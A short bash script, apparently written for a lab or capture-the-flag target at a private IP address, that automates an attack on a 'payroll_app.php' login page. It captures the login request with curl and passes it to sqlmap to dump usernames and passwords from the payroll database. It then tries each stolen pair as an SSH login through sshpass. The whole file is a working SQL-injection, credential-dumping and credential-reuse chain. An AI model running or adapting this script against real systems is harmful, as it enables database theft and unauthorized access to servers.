#!/bin/bash

# Server IP address
SERVER_IP="192.168.100.86"

#Collecting POST request
curl -H "Content-Type: text/plain" http://$SERVER_IP/payroll_app.php --trace-ascii /dev/stdout -d "user=123&password=345&s=OK" POST | head -n 12 | grep : | awk '{print $2,$3,$4}' > request.txt

#Use sqlmap with request and collect content from payroll database tables, searching for usernames and passwords
sqlmap -r request.txt -D payroll --tables --dump -C "username, password" | grep -E '^\|\s+\w+.*?\|\s+\w+.*?\s+\|$' | tail -n +2 | awk '{print $2,$4}' > mysql-username_password.txt


# Loop through each line in the credentials file
while IFS=' ' read -r username password
do
    echo "Trying to connect as $username ..."

    # Try to SSH and run the groups command, using password authentication
    sshpass -p "$password" ssh -n $username@$SERVER_IP "groups"
    echo ""
    # Check if the SSH connection was successful
    if [ $? -eq 0 ]; then
        echo "Successful login with username: $username"
#        break # Exit the loop if connection is successful
    else
        echo "Failed to connect with username: $username"
    fi

done < "mysql-username_password.txt"

